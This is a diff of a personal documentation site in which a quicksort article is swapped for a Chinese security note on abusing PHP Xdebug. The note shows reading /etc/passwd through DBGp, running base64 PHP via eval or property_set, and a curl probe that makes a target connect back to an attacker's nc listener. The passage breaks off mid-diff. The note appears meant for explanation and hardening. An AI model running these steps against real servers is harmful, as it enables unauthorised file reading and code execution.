@@ -14,31 +14,30 @@
 <link rel=icon type=image/png href=/favicons/android-96x96.png sizes=96x96>
 <link rel=icon type=image/png href=/favicons/android-144x144.png sizes=144x144>
 <link rel=icon type=image/png href=/favicons/android-192x192.png sizes=192x192>
-<title>04-快速排序 | Codiy's Notebook</title>
-<meta name=description content="1 基本思想
-通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。
-2 算法过程
-1、从数列中挑出一个元素，称为 “基准”（pivot）；
-2、将待排序元素进行分区，比基准值小的元素放在基准值前面，比基准值大 …">
-<meta property="og:title" content="04-快速排序">
-<meta property="og:description" content="1 基本思想 通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。
-2 算法过程 1、从数列中挑出一个元素，称为 “基准”（pivot）； 2、将待排序元素进行分区，比基准值小的元素放在基准值前面，比基准值大的元素放在基准值后面。分区结束后，该基准值就处于数组的中间位置；这个称为分区（partition）操作； 3、递归地（recursive）对左右两个分区重复以上步骤直到所有元素都是有序的。
-3 算法图解  4 PHP代码实现 /** * 快速排序: 每次选最左边的点, 将数组划分为左右两部分, 保证右边的比选点大,左边的都比选点小, 对左右两边递归 * 时间复杂度: 最好 O(nlogn) 最差 O(n2) * 空间复杂度: O(1) * 不稳定排序 */ function quickSort(&$arr, $start, $end) { $i = $start; $j = $end; $pivot = $arr[$start]; while ($j > $i) { // 右边有比选点小的, 扔到左边, 让下一while得以继续  while ($arr[$j] >= $pivot && $j > $i) { $j--; } if ($arr[$j] <= $pivot) { $temp = $arr[$j]; $arr[$j] = $arr[$i]; $arr[$i] = $temp; } // 左边的有比选点大的就,扔到右边, 让上一while得以继续  while ($arr[$i] <= $pivot && $j > $i) { $i++; } if ($arr[$i] >= $pivot) { $temp = $arr[$i]; $arr[$i] = $arr[$j]; $arr[$j] = $temp; } } // 循环结束后，i,j都指向选点  if ($i > $start) { quickSort($arr, $start, $i - 1); } if ($j < $end) { quickSort($arr, $j + 1, $end); } } $arr = [38, 19, 29, 91, 85, 12, 41, 21]; quickSort($arr, 0, count($arr) - 1); print_r($arr); 5 效率分析 1、时间复杂度：O(nlogn) 最好的情况：当分区选取的基准元素为待排序元素中的&#34;中值&#34;，时间复杂度为O(nlogn); 最坏的情况：当分区选取的基准元素为待排序元素中的最大或最小值，时间复杂度为O(n²)。 2、空间复杂度：O(log2n)，是不稳定排序。">
+<title>Php Xdebug | Codiy's Notebook</title>
+<meta name=description content="
+温馨提示: 放置到公网的 PHP 环境，请务必关闭 Xdebug.
+
+Xdebug 调试 PHP
+
+配置 xdbeug.mode 可设置 xdebug 开启的模式.
+配置 xdebug.start_with_request …">
+<meta property="og:title" content="Php Xdebug">
+<meta property="og:description" content="温馨提示: 放置到公网的 PHP 环境，请务必关闭 Xdebug.
+ Xdebug 调试 PHP  配置 xdbeug.mode 可设置 xdebug 开启的模式. 配置 xdebug.start_with_request 可通过设置请求参数 XDEBUG_SESSION_START=phpstrom 或者设置环境变量 XDEBUG_SESSION=1 或者设置请求头信息 Cookie: XDEBUG_SESSION=start 等方式开启 xdebug 配置 xdebug.discover_client_host, 支持通过 X-Forwarded-For 头信息获取调试客户端的地址 配置 xdebug.client_host, xdebug.client_port 指定调试客户端的地址和端口 Xdebug 支持 dbgp 调试协议, 可以用来进行源码阅读, 执行 eval 指令, 开启交互式 shell 等危险操作 Xdebug 的一般配置  zend_extension=xdebug.so [xdebug] xdebug.mode=debug xdebug.start_with_request=trigger ; start only XDEBUG_SESSION or XDEBUG_TRIGGER environment varibale is set xdebug.discover_client_host=yes xdebug.client_host=host.docker.internal xdebug.client_port=9000 xdebug.idekey=VSCODE Xdebug DBGp 协议 通过阅读 DBGp 的文档，我们可以注意到一些比较敏感的命令。">
 <meta property="og:type" content="article">
-<meta property="og:url" content="https://note.codiy.net/docs/2020/04/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/"><meta property="article:section" content="docs">
-<meta property="article:published_time" content="2020-04-22T21:29:26+08:00">
-<meta property="article:modified_time" content="2022-01-05T17:41:07+08:00">
-<meta itemprop=name content="04-快速排序">
-<meta itemprop=description content="1 基本思想 通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。
-2 算法过程 1、从数列中挑出一个元素，称为 “基准”（pivot）； 2、将待排序元素进行分区，比基准值小的元素放在基准值前面，比基准值大的元素放在基准值后面。分区结束后，该基准值就处于数组的中间位置；这个称为分区（partition）操作； 3、递归地（recursive）对左右两个分区重复以上步骤直到所有元素都是有序的。
-3 算法图解  4 PHP代码实现 /** * 快速排序: 每次选最左边的点, 将数组划分为左右两部分, 保证右边的比选点大,左边的都比选点小, 对左右两边递归 * 时间复杂度: 最好 O(nlogn) 最差 O(n2) * 空间复杂度: O(1) * 不稳定排序 */ function quickSort(&$arr, $start, $end) { $i = $start; $j = $end; $pivot = $arr[$start]; while ($j > $i) { // 右边有比选点小的, 扔到左边, 让下一while得以继续  while ($arr[$j] >= $pivot && $j > $i) { $j--; } if ($arr[$j] <= $pivot) { $temp = $arr[$j]; $arr[$j] = $arr[$i]; $arr[$i] = $temp; } // 左边的有比选点大的就,扔到右边, 让上一while得以继续  while ($arr[$i] <= $pivot && $j > $i) { $i++; } if ($arr[$i] >= $pivot) { $temp = $arr[$i]; $arr[$i] = $arr[$j]; $arr[$j] = $temp; } } // 循环结束后，i,j都指向选点  if ($i > $start) { quickSort($arr, $start, $i - 1); } if ($j < $end) { quickSort($arr, $j + 1, $end); } } $arr = [38, 19, 29, 91, 85, 12, 41, 21]; quickSort($arr, 0, count($arr) - 1); print_r($arr); 5 效率分析 1、时间复杂度：O(nlogn) 最好的情况：当分区选取的基准元素为待排序元素中的&#34;中值&#34;，时间复杂度为O(nlogn); 最坏的情况：当分区选取的基准元素为待排序元素中的最大或最小值，时间复杂度为O(n²)。 2、空间复杂度：O(log2n)，是不稳定排序。"><meta itemprop=datePublished content="2020-04-22T21:29:26+08:00">
-<meta itemprop=dateModified content="2022-01-05T17:41:07+08:00">
-<meta itemprop=wordCount content="158">
+<meta property="og:url" content="https://note.codiy.net/docs/2022/01/php-xdebug/"><meta property="article:section" content="docs">
+<meta property="article:published_time" content="2022-01-18T10:41:58+08:00">
+<meta property="article:modified_time" content="2022-01-18T10:41:58+08:00">
+<meta itemprop=name content="Php Xdebug">
+<meta itemprop=description content="温馨提示: 放置到公网的 PHP 环境，请务必关闭 Xdebug.
+ Xdebug 调试 PHP  配置 xdbeug.mode 可设置 xdebug 开启的模式. 配置 xdebug.start_with_request 可通过设置请求参数 XDEBUG_SESSION_START=phpstrom 或者设置环境变量 XDEBUG_SESSION=1 或者设置请求头信息 Cookie: XDEBUG_SESSION=start 等方式开启 xdebug 配置 xdebug.discover_client_host, 支持通过 X-Forwarded-For 头信息获取调试客户端的地址 配置 xdebug.client_host, xdebug.client_port 指定调试客户端的地址和端口 Xdebug 支持 dbgp 调试协议, 可以用来进行源码阅读, 执行 eval 指令, 开启交互式 shell 等危险操作 Xdebug 的一般配置  zend_extension=xdebug.so [xdebug] xdebug.mode=debug xdebug.start_with_request=trigger ; start only XDEBUG_SESSION or XDEBUG_TRIGGER environment varibale is set xdebug.discover_client_host=yes xdebug.client_host=host.docker.internal xdebug.client_port=9000 xdebug.idekey=VSCODE Xdebug DBGp 协议 通过阅读 DBGp 的文档，我们可以注意到一些比较敏感的命令。"><meta itemprop=datePublished content="2022-01-18T10:41:58+08:00">
+<meta itemprop=dateModified content="2022-01-18T10:41:58+08:00">
+<meta itemprop=wordCount content="379">
 <meta itemprop=keywords content><meta name=twitter:card content="summary">
-<meta name=twitter:title content="04-快速排序">
-<meta name=twitter:description content="1 基本思想 通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。
-2 算法过程 1、从数列中挑出一个元素，称为 “基准”（pivot）； 2、将待排序元素进行分区，比基准值小的元素放在基准值前面，比基准值大的元素放在基准值后面。分区结束后，该基准值就处于数组的中间位置；这个称为分区（partition）操作； 3、递归地（recursive）对左右两个分区重复以上步骤直到所有元素都是有序的。
-3 算法图解  4 PHP代码实现 /** * 快速排序: 每次选最左边的点, 将数组划分为左右两部分, 保证右边的比选点大,左边的都比选点小, 对左右两边递归 * 时间复杂度: 最好 O(nlogn) 最差 O(n2) * 空间复杂度: O(1) * 不稳定排序 */ function quickSort(&$arr, $start, $end) { $i = $start; $j = $end; $pivot = $arr[$start]; while ($j > $i) { // 右边有比选点小的, 扔到左边, 让下一while得以继续  while ($arr[$j] >= $pivot && $j > $i) { $j--; } if ($arr[$j] <= $pivot) { $temp = $arr[$j]; $arr[$j] = $arr[$i]; $arr[$i] = $temp; } // 左边的有比选点大的就,扔到右边, 让上一while得以继续  while ($arr[$i] <= $pivot && $j > $i) { $i++; } if ($arr[$i] >= $pivot) { $temp = $arr[$i]; $arr[$i] = $arr[$j]; $arr[$j] = $temp; } } // 循环结束后，i,j都指向选点  if ($i > $start) { quickSort($arr, $start, $i - 1); } if ($j < $end) { quickSort($arr, $j + 1, $end); } } $arr = [38, 19, 29, 91, 85, 12, 41, 21]; quickSort($arr, 0, count($arr) - 1); print_r($arr); 5 效率分析 1、时间复杂度：O(nlogn) 最好的情况：当分区选取的基准元素为待排序元素中的&#34;中值&#34;，时间复杂度为O(nlogn); 最坏的情况：当分区选取的基准元素为待排序元素中的最大或最小值，时间复杂度为O(n²)。 2、空间复杂度：O(log2n)，是不稳定排序。">
+<meta name=twitter:title content="Php Xdebug">
+<meta name=twitter:description content="温馨提示: 放置到公网的 PHP 环境，请务必关闭 Xdebug.
+ Xdebug 调试 PHP  配置 xdbeug.mode 可设置 xdebug 开启的模式. 配置 xdebug.start_with_request 可通过设置请求参数 XDEBUG_SESSION_START=phpstrom 或者设置环境变量 XDEBUG_SESSION=1 或者设置请求头信息 Cookie: XDEBUG_SESSION=start 等方式开启 xdebug 配置 xdebug.discover_client_host, 支持通过 X-Forwarded-For 头信息获取调试客户端的地址 配置 xdebug.client_host, xdebug.client_port 指定调试客户端的地址和端口 Xdebug 支持 dbgp 调试协议, 可以用来进行源码阅读, 执行 eval 指令, 开启交互式 shell 等危险操作 Xdebug 的一般配置  zend_extension=xdebug.so [xdebug] xdebug.mode=debug xdebug.start_with_request=trigger ; start only XDEBUG_SESSION or XDEBUG_TRIGGER environment varibale is set xdebug.discover_client_host=yes xdebug.client_host=host.docker.internal xdebug.client_port=9000 xdebug.idekey=VSCODE Xdebug DBGp 协议 通过阅读 DBGp 的文档，我们可以注意到一些比较敏感的命令。">
 <link href=/scss/main.css rel=stylesheet>
 <script src=https://code.jquery.com/jquery-3.6.0.min.js integrity=sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK crossorigin=anonymous></script>
 </head>
@@ -107,8 +106,8 @@
 </li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-docs202011gnupg-usage-li>
 <input type=checkbox id=m-docs202011gnupg-usage-check>
 <label for=m-docs202011gnupg-usage-check><a href=/docs/2020/11/gnupg-usage/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-docs202011gnupg-usage><span>Gnupg Usage</span></a></label>
-</li><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m-docsalgorithm-li>
-<input type=checkbox id=m-docsalgorithm-check checked>
+</li><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child" id=m-docsalgorithm-li>
+<input type=checkbox id=m-docsalgorithm-check>
 <label for=m-docsalgorithm-check><a href=/docs/algorithm/ class="align-left pl-0 td-sidebar-link td-sidebar-link__section" id=m-docsalgorithm><span>Algorithms</span></a></label>
 <ul class="ul-2 foldable">
 <li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-docs20200401-bubble-li>
@@ -120,9 +119,9 @@
 </li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-docs20200403-e98089e68ba9e68e92e5ba8f-li>
 <input type=checkbox id=m-docs20200403-e98089e68ba9e68e92e5ba8f-check>
 <label for=m-docs20200403-e98089e68ba9e68e92e5ba8f-check><a href=/docs/2020/04/03-%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-docs20200403-e98089e68ba9e68e92e5ba8f><span>03-选择排序</span></a></label>
-</li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child active-path" id=m-docs20200404-e5bfabe9809fe68e92e5ba8f-li>
-<input type=checkbox id=m-docs20200404-e5bfabe9809fe68e92e5ba8f-check checked>
-<label for=m-docs20200404-e5bfabe9809fe68e92e5ba8f-check><a href=/docs/2020/04/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/ class="align-left pl-0 active td-sidebar-link td-sidebar-link__page" id=m-docs20200404-e5bfabe9809fe68e92e5ba8f><span class=td-sidebar-nav-active-item>04-快速排序</span></a></label>
+</li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-docs20200404-e5bfabe9809fe68e92e5ba8f-li>
+<input type=checkbox id=m-docs20200404-e5bfabe9809fe68e92e5ba8f-check>
+<label for=m-docs20200404-e5bfabe9809fe68e92e5ba8f-check><a href=/docs/2020/04/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-docs20200404-e5bfabe9809fe68e92e5ba8f><span>04-快速排序</span></a></label>
 </li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-docs20200405-e5bd92e5b9b6e68e92e5ba8f-li>
 <input type=checkbox id=m-docs20200405-e5bd92e5b9b6e68e92e5ba8f-check>
 <label for=m-docs20200405-e5bd92e5b9b6e68e92e5ba8f-check><a href=/docs/2020/04/05-%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-docs20200405-e5bd92e5b9b6e68e92e5ba8f><span>05-归并排序</span></a></label>
@@ -143,13 +142,13 @@
 <label for=m-docs202201essential-grammars-in-use-check><a href=/docs/2022/01/essential-grammars-in-use/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-docs202201essential-grammars-in-use><span>Essential Grammars in Use</span></a></label>
 </li>
 </ul>
-</li><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child" id=m-docssecurity-li>
-<input type=checkbox id=m-docssecurity-check>
+</li><li class="td-sidebar-nav__section-title td-sidebar-nav__section with-child active-path" id=m-docssecurity-li>
+<input type=checkbox id=m-docssecurity-check checked>
 <label for=m-docssecurity-check><a href=/docs/security/ class="align-left pl-0 td-sidebar-link td-sidebar-link__section" id=m-docssecurity><span>Security</span></a></label>
 <ul class="ul-2 foldable">
-<li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-docs202201php-xdebug-li>
-<input type=checkbox id=m-docs202201php-xdebug-check>
-<label for=m-docs202201php-xdebug-check><a href=/docs/2022/01/php-xdebug/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-docs202201php-xdebug><span>Php Xdebug</span></a></label>
+<li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child active-path" id=m-docs202201php-xdebug-li>
+<input type=checkbox id=m-docs202201php-xdebug-check checked>
+<label for=m-docs202201php-xdebug-check><a href=/docs/2022/01/php-xdebug/ class="align-left pl-0 active td-sidebar-link td-sidebar-link__page" id=m-docs202201php-xdebug><span class=td-sidebar-nav-active-item>Php Xdebug</span></a></label>
 </li><li class="td-sidebar-nav__section-title td-sidebar-nav__section without-child" id=m-docs202102php-deserialization-and-ssrf-exploiting-li>
 <input type=checkbox id=m-docs202102php-deserialization-and-ssrf-exploiting-check>
 <label for=m-docs202102php-deserialization-and-ssrf-exploiting-check><a href=/docs/2021/02/php-deserialization-and-ssrf-exploiting/ class="align-left pl-0 td-sidebar-link td-sidebar-link__page" id=m-docs202102php-deserialization-and-ssrf-exploiting><span>Exploiting PHP deserialization And SSRF</span></a></label>
@@ -176,19 +175,24 @@
 </aside>
 <aside class="d-none d-xl-block col-xl-2 td-sidebar-toc d-print-none">
 <div class="td-page-meta ml-2 pb-1 pt-2 mb-0">
-<a href=https://github.com/codiy1992/notebook/tree/master/content/en/docs/algorithm/04-quick.md class=td-page-meta--view target=_blank rel=noopener><i class="fa fa-file-alt fa-fw"></i> View page source</a>
-<a href=https://github.com/codiy1992/notebook/edit/master/content/en/docs/algorithm/04-quick.md class=td-page-meta--edit target=_blank rel=noopener><i class="fa fa-edit fa-fw"></i> Edit this page</a>
-<a href="https://github.com/codiy1992/notebook/new/master/content/en/docs/algorithm/04-quick.md?filename=change-me.md&value=---%0Atitle%3A+%22Long+Page+Title%22%0AlinkTitle%3A+%22Short+Nav+Title%22%0Aweight%3A+100%0Adescription%3A+%3E-%0A+++++Page+description+for+heading+and+indexes.%0A---%0A%0A%23%23+Heading%0A%0AEdit+this+template+to+create+your+new+page.%0A%0A%2A+Give+it+a+good+name%2C+ending+in+%60.md%60+-+e.g.+%60getting-started.md%60%0A%2A+Edit+the+%22front+matter%22+section+at+the+top+of+the+page+%28weight+controls+how+its+ordered+amongst+other+pages+in+the+same+directory%3B+lowest+number+first%29.%0A%2A+Add+a+good+commit+message+at+the+bottom+of+the+page+%28%3C80+characters%3B+use+the+extended+description+field+for+more+detail%29.%0A%2A+Create+a+new+branch+so+you+can+preview+your+new+file+and+request+a+review+via+Pull+Request.%0A" class=td-page-meta--child target=_blank rel=noopener><i class="fa fa-edit fa-fw"></i> Create child page</a>
-<a href="https://github.com/codiy1992/notebook/issues/new?title=04-%e5%bf%ab%e9%80%9f%e6%8e%92%e5%ba%8f" class=td-page-meta--issue target=_blank rel=noopener><i class="fab fa-github fa-fw"></i> Create documentation issue</a>
+<a href=https://github.com/codiy1992/notebook/tree/master/content/en/docs/security/php-xdebug.md class=td-page-meta--view target=_blank rel=noopener><i class="fa fa-file-alt fa-fw"></i> View page source</a>
+<a href=https://github.com/codiy1992/notebook/edit/master/content/en/docs/security/php-xdebug.md class=td-page-meta--edit target=_blank rel=noopener><i class="fa fa-edit fa-fw"></i> Edit this page</a>
+<a href="https://github.com/codiy1992/notebook/new/master/content/en/docs/security/php-xdebug.md?filename=change-me.md&value=---%0Atitle%3A+%22Long+Page+Title%22%0AlinkTitle%3A+%22Short+Nav+Title%22%0Aweight%3A+100%0Adescription%3A+%3E-%0A+++++Page+description+for+heading+and+indexes.%0A---%0A%0A%23%23+Heading%0A%0AEdit+this+template+to+create+your+new+page.%0A%0A%2A+Give+it+a+good+name%2C+ending+in+%60.md%60+-+e.g.+%60getting-started.md%60%0A%2A+Edit+the+%22front+matter%22+section+at+the+top+of+the+page+%28weight+controls+how+its+ordered+amongst+other+pages+in+the+same+directory%3B+lowest+number+first%29.%0A%2A+Add+a+good+commit+message+at+the+bottom+of+the+page+%28%3C80+characters%3B+use+the+extended+description+field+for+more+detail%29.%0A%2A+Create+a+new+branch+so+you+can+preview+your+new+file+and+request+a+review+via+Pull+Request.%0A" class=td-page-meta--child target=_blank rel=noopener><i class="fa fa-edit fa-fw"></i> Create child page</a>
+<a href="https://github.com/codiy1992/notebook/issues/new?title=Php%20Xdebug" class=td-page-meta--issue target=_blank rel=noopener><i class="fab fa-github fa-fw"></i> Create documentation issue</a>
 <a href=https://github.com/codiy1992/notebook/issues/new class=td-page-meta--project-issue target=_blank rel=noopener><i class="fas fa-tasks fa-fw"></i> Create project issue</a>
 </div>
 <div class=td-toc><nav id=TableOfContents>
 <ul>
-<li><a href=#1-基本思想>1 基本思想</a></li>
-<li><a href=#2-算法过程>2 算法过程</a></li>
-<li><a href=#3-算法图解>3 算法图解</a></li>
-<li><a href=#4-php代码实现>4 PHP代码实现</a></li>
-<li><a href=#5-效率分析>5 效率分析</a></li>
+<li><a href=#xdebug-调试-php>Xdebug 调试 PHP</a></li>
+<li><a href=#xdebug-dbgp-协议>Xdebug DBGp 协议</a></li>
+<li><a href=#服务器-xdebug-嗅探>服务器 Xdebug 嗅探</a></li>
+<li><a href=#配置-xdebug-client>配置 Xdebug Client</a>
+<ul>
+<li><a href=#方式一-简单的通过-nc-命令-监听常见的-xdebug-client-端口-9000-9003>方式一: 简单的通过 <strong><code>nc</code></strong> 命令, 监听常见的 xdebug client 端口 <strong><code>9000</code></strong>, <strong><code>9003</code></strong></a></li>
+<li><a href=#方式二-利用脚本文件-实现当-xdebug-与-client-建立连接后-client-交互式的发送指令给目标机器>方式二: 利用脚本文件, 实现当 xdebug 与 client 建立连接后, client 交互式的发送指令给目标机器</a></li>
+<li><a href=#利用-gofrp6-实现将本机作为-xdebug-client-方便调试>利用 <strong><a href=https://github.com/fatedier/frp>gofrp</a></strong> 实现将本机作为 <strong>xdebug client</strong>, 方便调试</a></li>
+</ul>
+</li>
 </ul>
 </nav></div>
 </aside>
@@ -199,85 +203,135 @@
 <a href=https://note.codiy.net/docs/>Documentation</a>
 </li>
 <li class=breadcrumb-item>
-<a href=https://note.codiy.net/docs/algorithm/>Algorithms</a>
+<a href=https://note.codiy.net/docs/security/>Security</a>
 </li>
 <li class="breadcrumb-item active" aria-current=page>
-<a href=https://note.codiy.net/docs/2020/04/04-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F/>04-快速排序</a>
+<a href=https://note.codiy.net/docs/2022/01/php-xdebug/>Php Xdebug</a>
 </li>
 </ol>
 </nav>
 <div class=td-content>
-<h1>04-快速排序</h1>
+<h1>Php Xdebug</h1>
 <header class=article-meta>
-<p class=reading-time><i class="fa fa-clock" aria-hidden=true></i>&nbsp; less than a minute &nbsp;</p>
+<p class=reading-time><i class="fa fa-clock" aria-hidden=true></i>&nbsp; 2 minute read &nbsp;</p>
 </header>
-<h2 id=1-基本思想>1 基本思想</h2>
-<p>通过一趟排序将待排记录分隔成独立的两部分，其中一部分记录的关键字均比另一部分的关键字小，则可分别对这两部分记录继续进行排序，以达到整个序列有序。</p>
-<h2 id=2-算法过程>2 算法过程</h2>
-<p>1、从数列中挑出一个元素，称为 “基准”（pivot）；
-2、将待排序元素进行分区，比基准值小的元素放在基准值前面，比基准值大的元素放在基准值后面。分区结束后，该基准值就处于数组的中间位置；这个称为分区（partition）操作；
-3、递归地（recursive）对左右两个分区重复以上步骤直到所有元素都是有序的。</p>
-<h2 id=3-算法图解>3 算法图解</h2>
-<p>
+<blockquote>
+<p>温馨提示: <strong>放置到公网的 PHP 环境，请务必关闭 Xdebug.</strong></p>
+</blockquote>
+<h2 id=xdebug-调试-php>Xdebug 调试 PHP</h2>
+<ul>
+<li>配置 <a href=https://xdebug.org/docs/all_settings#mode><code>xdbeug.mode</code></a> 可设置 xdebug 开启的模式.</li>
+<li>配置 <a href=https://xdebug.org/docs/all_settings#start_with_request><code>xdebug.start_with_request</code></a> 可通过设置请求参数 <code>XDEBUG_SESSION_START=phpstrom</code> 或者设置环境变量
+<code>XDEBUG_SESSION=1</code> 或者设置请求头信息 <code>Cookie: XDEBUG_SESSION=start</code> 等方式开启 xdebug</li>
+<li>配置 <a href=https://xdebug.org/docs/all_settings#discover_client_host><code>xdebug.discover_client_host</code></a>, 支持通过 <code>X-Forwarded-For</code> 头信息获取调试客户端的地址</li>
+<li>配置 <code>xdebug.client_host</code>, <code>xdebug.client_port</code> 指定调试客户端的地址和端口</li>
+<li>Xdebug 支持 <a href=https://xdebug.org/docs/dbgp><code>dbgp 调试协议</code></a>, 可以用来进行<strong>源码阅读</strong>, <strong>执行 eval 指令</strong>, <strong>开启交互式 shell</strong> 等危险操作</li>
+<li>Xdebug 的一般配置</li>
+</ul>
+<div class=highlight><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ini data-lang=ini><span style=color:#658b00>zend_extension</span>=<span style=color:#cd5555>xdebug.so</span>
+<span style=color:#8b008b;font-weight:700>[xdebug]</span>
+<span style=color:#658b00>xdebug.mode</span>=<span style=color:#cd5555>debug</span>
+<span style=color:#658b00>xdebug.start_with_request</span>=<span style=color:#cd5555>trigger ; start only XDEBUG_SESSION or XDEBUG_TRIGGER environment varibale is set</span>
+<span style=color:#658b00>xdebug.discover_client_host</span>=<span style=color:#cd5555>yes</span>
+<span style=color:#658b00>xdebug.client_host</span>=<span style=color:#cd5555>host.docker.internal</span>
+<span style=color:#658b00>xdebug.client_port</span>=<span style=color:#cd5555>9000</span>
+<span style=color:#658b00>xdebug.idekey</span>=<span style=color:#cd5555>VSCODE</span>
+</code></pre></div><h2 id=xdebug-dbgp-协议>Xdebug DBGp 协议</h2>
+<p>通过阅读 <a href=https://xdebug.org/docs/dbgp>DBGp</a> 的文档，我们可以注意到一些比较敏感的命令。</p>
+<ul>
+<li>Core Commands > source</li>
+<li>Extended Commands > eval</li>
+<li>Extended Commands > interact - Interactive Shell</li>
+<li>Core Commands > property_set</li>
+</ul>
+<p><strong>1. <code>source -i transaction_id -f FILE_URI</code></strong></p>
+<p><code>transaction_id</code> 貌似没有那么硬性的要求，每次都为 1 即可 FILE_URI 是要读取的文件的路径，需要注意的是
+Xdebug 也受限于 <code>open_basedir</code></p>
+<pre tabindex=0><code>source -i 1 -f file:///etc/passwd
+</code></pre><p>此处也可以用 <code>php://PHP_SCRIPT_LOCATION</code> 来读取文件, 因而也可能用来发起 <strong>SSRF</strong> 攻击</p>
+<p><strong>2. <code>eval -i transaction_id -- {DATA}</code></strong></p>
+<p><code>{DATA}</code> 为 base64 过的 PHP 代码。</p>
+<p><strong>3. interact</strong></p>
+<p>暂未研究</p>
+<p><strong>4. property_set</strong></p>
+<p>根据 Xdebug 实现的 dbgp 协议, property_set 存在一处执行 evel 命令的入口, 详见源码 <a href=https://github.com/xdebug/xdebug/blob/master/src/debugger/handler_dbgp.c#L1628-L1630>handler_dbgp.c</a></p>
+<div class=highlight><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=color:#228b22>/* Do the eval */</span>
+eval_string = xdebug_sprintf(<span style=color:#cd5555>&#34;%s = %s %s&#34;</span>, CMD_OPTION_CHAR(<span style=color:#cd5555>&#39;n&#39;</span>), cast_as, new_value);
+res = xdebug_do_eval(eval_string, &amp;ret_zval);
+</code></pre></div><p>利用方式:</p>
+<pre tabindex=0><code>property_set -n $a -i 1 -c 1 -- c3lzdGVtKCJpZCIpOw==
+property_get -n $a -i 1 -c 1 -p 0
+</code></pre><h2 id=服务器-xdebug-嗅探>服务器 Xdebug 嗅探</h2>
+<p>通过一条 <strong>CURL</strong> 指令即可嗅探目标服务器是否开启了 <strong>Xdebug</strong></p>
+<div class=highlight><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>curl -v <span style=color:#cd5555>&#34;http://</span><span style=color:#cd5555>${</span><span style=color:#00688b>TARGET_HOST</span><span style=color:#cd5555>}</span><span style=color:#cd5555>/?XDEBUG_SESSION_START=phpstrom&#34;</span> <span style=color:#cd5555>\
+</span><span style=color:#cd5555></span>    -H <span style=color:#cd5555>&#34;X-Forwarded-For: </span><span style=color:#cd5555>${</span><span style=color:#00688b>XDEBUG_CLIENT_HOST</span><span style=color:#cd5555>}</span><span style=color:#cd5555>&#34;</span> -H <span style=color:#cd5555>&#34;Cookie: XDEBUG_SESSION=start&#34;</span>
+</code></pre></div><p><strong>原理简介:</strong> 服务器端开启了 Xdebug 在收到请求时, 发现请求携带了 <code>XDEBUG_SESSION_START</code> 参数或者 <code>Cookie: XDEBUG_SESSION=start</code>
+头信息, 会尝试用 <code>X-Forwarded-For</code> 所指定的地址作为 Xdebug 的远端(xdebug client), 向其发起连接, 连接的端口为 <code>xdebug.client_port</code>
+设置的值.</p>
+<h2 id=配置-xdebug-client>配置 Xdebug Client</h2>
+<p>即用来与目标机器 xdebug 交互的 client.</p>
+<h3 id=方式一-简单的通过-nc-命令-监听常见的-xdebug-client-端口-9000-9003>方式一: 简单的通过 <strong><code>nc</code></strong> 命令, 监听常见的 xdebug client 端口 <strong><code>9000</code></strong>, <strong><code>9003</code></strong></h3>
+<div class=highlight><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nc -lvv <span style=color:#b452cd>9000</span>
+nc -lvv <span style=color:#b452cd>9003</span>
+</code></pre></div><p>运行 <strong>CURL</strong> 嗅探请求, 当 <strong>nc</strong> 回显出类似如下的 xml 文档，即说明目标机器 xdebug 处于可利用状态.
 <p class=md__image>
-<img src=https://img.codiy.net/algorithm/2020-04/quick.gif alt=算法图解>
+<img src=https://img.codiy.net/uncataloged/2022-01/18131632.png alt>
 </p></p>
-<h2 id=4-php代码实现>4 PHP代码实现</h2>
-<div class=highlight><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#cd5555>/**
-</span><span style=color:#cd5555> * 快速排序: 每次选最左边的点, 将数组划分为左右两部分, 保证右边的比选点大,左边的都比选点小, 对左右两边递归
-</span><span style=color:#cd5555> * 时间复杂度: 最好 O(nlogn) 最差 O(n2)
-</span><span style=color:#cd5555> * 空间复杂度: O(1)
-</span><span style=color:#cd5555> * 不稳定排序
-</span><span style=color:#cd5555> */</span>
